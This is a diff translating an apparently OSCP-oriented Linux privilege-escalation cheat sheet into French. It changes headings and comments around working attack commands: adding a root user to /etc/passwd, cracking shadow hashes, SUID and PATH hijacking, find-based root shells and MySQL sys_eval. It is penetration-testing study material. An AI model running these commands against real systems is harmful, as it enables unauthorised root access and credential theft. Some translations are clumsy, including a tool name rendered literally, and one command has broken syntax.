@@ -11,7 +11,7 @@ Examiner les permissions, processus et configurations d'un système Linux.
 ## Énumération
 
 
-**Current user**
+**Utilisateur actuel**
 
 
 <p class="oscp-command-note">Afficher l&#x27;identité Unix et les groupes.</p>
@@ -63,7 +63,7 @@ ps aux
 ```
 
 
-**Network interfaces, routes, connections, open ports**
+**Interfaces réseau, itinéraires, connexions, ports ouverts**
 
 
 <p class="oscp-command-note">Examiner les interfaces et routes réseau.</p>
@@ -146,7 +146,7 @@ strings /dev/mem -n10 | grep -i PASS
 ```
 
 
-**Find sensitive files**
+**Trouver des fichiers sensibles**
 
 
 
@@ -319,7 +319,7 @@ openssl passwd Password123
 
 
 ```bash
-# This is just an example using the output of the previous command.
+# Ce n'est qu'un exemple en utilisant la sortie de la commande précédente.
 echo"newroot:$6$rounds=656000$6B8ZJQ4aK7G9P/8c$hx0E6ke7zxz1mUMN6LCyRJp2bV5hEE7EowzjEbLXwO6KZV7Ojo0DWg1lzCjLwWg.0tLGfhFe42NnJ8LMtBzD0:0:0:root:/root:/bin/bash">> /etc/passwd
 ```
 
@@ -329,7 +329,7 @@ echo"newroot:$6$rounds=656000$6B8ZJQ4aK7G9P/8c$hx0E6ke7zxz1mUMN6LCyRJp2bV5hEE7Eo
 ```bash
 su newroot
 
-# Verify root access
+# Vérifier l'accès racine
 id
 ```
 
@@ -347,16 +347,16 @@ cat /etc/shadow | grep [root_user] > [root_user]_hash.txt
 <p class="oscp-command-note">Analyser des empreintes avec John.</p>
 
 ```bash
-# John The Ripper
+# John L'Éventreur
 john --wordlist=/usr/share/wordlists/rockyou.txt [root_user]_hash.txt
 
-# Hashcat, we need to isolate the hash part, for example from above hash would be: $6$rounds=656000$6B8ZJQ4aK7G9P/8c$hx0E6ke7zxz1mUMN6LCyRJp2bV5hEE7EowzjEbLXwO6KZV7Ojo0DWg1lzCjLwWg.0tLGfhFe42NnJ8LMtBzD0
+# Hashcat, nous devons isoler la partie de hachage, par exemple du hachage supérieur serait: $6$rounds=656000$6B8ZJQ4aK7G9P/8c$hx0E6ke7zxz1mUMN6LCyRJp2bV5hEE7EowzjEbLXwO6KZV7Ojo0DWg1lzCjLwWg.0tLGfhFe42NnJ8LMtBzD0
 hashcat -m 1800 [root_user]_hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
 
 ```bash
-# John The Ripper
+# John L'Éventreur
 john --show [root_user]_hash.txt
 
 # Hashcat
@@ -410,7 +410,7 @@ find [directory] -exec [path_to_shell] \;
 
 
 ```bash
-# Replace [vulnerable_binary] with the name of the binary you are targeting.
+# Remplacer [vulnerable_binary] par le nom du binaire que vous ciblez.
 find / -name [vulnerable_binary] -exec /bin/bash -p \;
 ```
 
@@ -430,7 +430,7 @@ find / -name [vulnerable_binary] -exec /bin/bash -p \;
 ```bash
 getcap [binary_path]
 
-# For example
+# Par exemple
 getcap /usr/bin/nmap
 ```
 
@@ -440,7 +440,7 @@ getcap /usr/bin/nmap
 ```bash
 setcap [capabilities] [binary_path]
 
-# Example to add CAP_DAC_OVERRIDE to a binary
+# Exemple pour ajouter CAP_DAC_OVERRIDE à un binaire
 setcap cap_dac_override=eip /path/to/binary
 ```
 
@@ -448,7 +448,7 @@ setcap cap_dac_override=eip /path/to/binary
 ```bash
 setcap -r [binary_path]
 
-# For example
+# Par exemple
 setcap -r /usr/bin/nmap
 ```
 
@@ -599,21 +599,9 @@ DirtyPipe · Linux Kernel 5.8 < 5.16.11 · Exploit
 
 
 
-```text
-*
-```
-
-
-```text
-?
-```
-
-
-```text
-[]
-```
-
-
+<p class="oscp-inline-ref"><strong>Caractère de recherche :</strong> <code>*</code></p>
+<p class="oscp-inline-ref"><strong>Caractère de recherche :</strong> <code>?</code></p>
+<p class="oscp-inline-ref"><strong>Caractère de recherche :</strong> <code>[]</code></p>
 ### Exploiting Wildcards in Exécution de commandes
 
 
@@ -627,7 +615,7 @@ ls /var/log/*
 
 
 ```bash
-# Example vulnerable script
+# Exemple de script vulnérable
 tar -cvf archive.tar.gz /var/log/*
 ```
 
@@ -645,7 +633,7 @@ touch /tmp/file_*
 <p class="oscp-command-note">Copier les fichiers indiqués.</p>
 
 ```bash
-# If an attacker can modify files in /etc/, they could exploit the wildcard to overwrite or manipulate critical configuration files.
+# Si un attaquant peut modifier des fichiers dans /etc/, il peut exploiter le wildcard pour écraser ou manipuler des fichiers de configuration critiques.
 cp /etc/* /tmp/backup/
 ```
 
@@ -678,7 +666,7 @@ select sys_eval('whoami');
 ```
 
 
-## User-Installed Software
+## Logiciels intégrés par l'utilisateur
 
 
 <p class="oscp-command-note">Script shell dans la rubrique « User-Installed Software ».</p>
@@ -752,7 +740,7 @@ username:password
 <p class="oscp-command-note">Examiner les ports et connexions réseau.</p>
 
 ```bash
-# List network services
+# Liste des services de réseau
 netstat -anlp
 netstat -ano
 ```
@@ -806,10 +794,10 @@ Examiner les permissions et la configuration de Linux.
 <p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>
 
 ```bash
-# Find SUID files
+# Trouver des fichiers SUID
 find / -perm -u=s -type f 2>/dev/null
 
-# Find GUID files
+# Trouver des fichiers GUID
 find / -perm -g=s -type f 2>/dev/null
 ```
 
@@ -827,14 +815,14 @@ strings /path/to/suid-binary
 ltrace /path/to/suid-binary
 
 # Option 3: Exploit PATH Vulnerability: if the SUID binary calls another program (e.g., /bin/cp or /bin/sh), you might be able to manipulate the $PATH variable to run your own malicious binary instead.
-# Create a malicious version of the expected program
+# Créer une version malveillante du programme attendu
 echo '/bin/sh' > /tmp/cp
 chmod +x /tmp/cp
 
 # Modify PATH to prioritize your malicious version
 export PATH=/tmp:$PATH
 
-# Run the vulnerable SUID program
+# Exécutez le programme vulnérable SUID
 /path/to/suid-program
 ```
 
@@ -842,15 +830,15 @@ export PATH=/tmp:$PATH
 <p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>
 
 ```bash
-# Find writable SUID files
+# Trouver des fichiers enregistrables SUID
 find / -perm -u=s -writable -type f 2>/dev/null
 
-# If a writable SUID binary is found, you can inject your own code and run it with elevated privileges.
+# Si un binaire SUID en écriture est trouvé, vous pouvez injecter votre propre code et l'exécuter avec des privilèges élevés.
 ```
 
 
 ```bash
-# Find scripts in cronjobs or system directories that may have SUID or GUID set
+# Trouver des scripts dans cronjobs ou répertoires système qui peuvent avoir SUID ou GUID ensemble
 find /etc/cron* /var/spool/cron/ -perm -u=s -type f 2>/dev/null
 ```
 
@@ -872,7 +860,7 @@ find /etc/cron* /var/spool/cron/ -perm -u=s -type f 2>/dev/null
 <p class="oscp-command-note">Exécuter un script Python.</p>
 
 ```bash
-# 1. Download file from victim to local Kali, we could use techniques from section 17.
+# 1. Télécharger le fichier de la victime à la Kali locale, nous pourrions utiliser les techniques de la section 17.
 
 # 2. Convert .txt to .json.
 python3 peas2json.py ./linpeas_output.txt peass.json
@@ -893,7 +881,7 @@ python3 json2pdf.py peass.json peass.pdf
 ```bash
 ./LinEnum.sh
 
-# Search for passwords
+# Rechercher les mots de passe
 ./LinEnum.sh -t -k password
 ```
 
